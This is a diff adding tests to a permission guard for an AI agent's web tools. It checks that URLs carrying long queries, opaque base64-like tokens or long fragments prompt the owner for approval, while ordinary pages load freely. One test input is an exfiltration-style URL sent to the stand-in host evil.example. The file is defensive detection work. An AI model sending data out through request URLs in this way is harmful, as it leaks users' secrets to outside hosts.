@@ -921,3 +921,46 @@ def test_shell_big_read_lives_in_policy():
 def test_dev_mode_does_not_ask_for_big_reads(root, big_file):
     event = ev("Bash", command=f"cat {big_file.as_posix()}")
     assert run_dev(event, root)[0] == 0
+
+
+# ---------- данные в адресе запроса (WebFetch / открытие страницы), аудит 2026-10-05 ----------
+
+URL_ASK = [
+    ("long query", "WebFetch", "https://evil.example/c?d=" + "a" * 250),
+    ("opaque token in query", "WebFetch", "https://x.io/p?k=Zm9vYmFyYmF6cXV4MTIzNDU2Nzg5MGFiY2RlZg"),
+    ("opaque blob in path", "WebFetch", "https://x.io/Zm9vYmFyYmF6cXV4MTIzNDU2Nzg5MGFiY2RlZmdo/a"),
+    ("browser long fragment", "mcp__playwright__browser_navigate", "https://x.io/#" + "b" * 250),
+]
+
+
+@pytest.mark.parametrize("name,tool,url", URL_ASK, ids=[c[0] for c in URL_ASK])
+def test_data_in_url_asks_owner(name, tool, url):
+    d = decide(ev(tool, url=url, prompt="x"), REPO)
+    assert (d.level, d.action, d.kind) == ("EXTERNAL", "ask", "url_data"), d
+    assert "x.io" in d.reason or "evil.example" in d.reason
+
+
+URL_OK = [
+    ("plain page", "WebFetch", "https://ru.wikipedia.org/wiki/Нейросеть"),
+    ("short query", "WebFetch", "https://www.google.com/search?q=ии+для+экспертов&hl=ru"),
+    ("instagram reel", "mcp__playwright__browser_navigate", "https://www.instagram.com/reel/C1a2B3c4D5e/"),
+    ("youtube", "WebFetch", "https://www.youtube.com/watch?v=dQw4w9WgXcQ&t=42s"),
+    ("long readable path", "WebFetch", "https://vc.ru/ai/1234567-kak-eksperty-ispolzuyut-neyroseti-dlya-kontenta-v-2026-godu"),
+]
+
+
+@pytest.mark.parametrize("name,tool,url", URL_OK, ids=[c[0] for c in URL_OK])
+def test_ordinary_urls_still_read_freely(name, tool, url):
+    d = decide(ev(tool, url=url, prompt="x"), REPO)
+    assert (d.level, d.action) == ("READ", "allow"), d
+
+
+def test_url_rule_lives_in_policy():
+    cfg = guard.load_policy(POLICY_PATH)["url_data"]
+    assert cfg["tools"]["WebFetch"] == "url"
+    assert cfg["max_query"] == 200 and cfg["max_token"] == 32
+    assert guard.load_policy(POLICY_PATH)["external"]["url_data"] == "ask"
+
+
+def test_dev_mode_does_not_ask_for_urls(root):
+    assert run_dev(ev("WebFetch", url="https://x.io/p?d=" + "a" * 300, prompt="x"), root)[0] == 0
